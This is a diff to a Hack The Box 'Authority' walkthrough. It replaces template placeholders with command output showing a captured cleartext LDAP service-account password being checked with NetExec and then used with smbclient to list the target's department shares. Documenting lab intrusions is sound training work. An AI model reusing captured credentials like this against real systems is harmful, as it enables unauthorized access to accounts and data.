@@ -406,23 +406,32 @@ clicking on "Test LDAP profile"
 [*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb                                                                                                             
 ```
 
----
-## Foothold
+```
+nxc ldap authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
+LDAP        10.129.229.56   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
+LDAP        10.129.229.56   389    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
 
-How you gained initial access to the machine.
-
-### Vulnerability
-
-Description of the vulnerability exploited.
-
-### Exploitation
-
-Step-by-step exploitation with commands.
-
-```shell
-# Commands used
 ```
 
+---
+```
+smbclient -U svc_ldap '//authority.htb/Department Shares' --password=lDaP_1n_th3_cle4r!
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Mar 28 13:59:41 2023
+  ..                                  D        0  Tue Mar 28 13:59:41 2023
+  Accounting                          D        0  Tue Mar 28 13:59:37 2023
+  Finance                             D        0  Tue Mar 28 13:57:24 2023
+  HR                                  D        0  Tue Mar 28 13:57:12 2023
+  IT                                  D        0  Tue Mar 28 13:57:15 2023
+  Marketing                           D        0  Tue Mar 28 13:57:08 2023
+  Operations                          D        0  Tue Mar 28 13:57:28 2023
+  R&D                                 D        0  Tue Mar 28 13:57:20 2023
+  Sales                               D        0  Tue Mar 28 13:58:54 2023
+
+                5888511 blocks of size 4096. 1496595 blocks available
+
+```
 ---
 ## User Flag
 
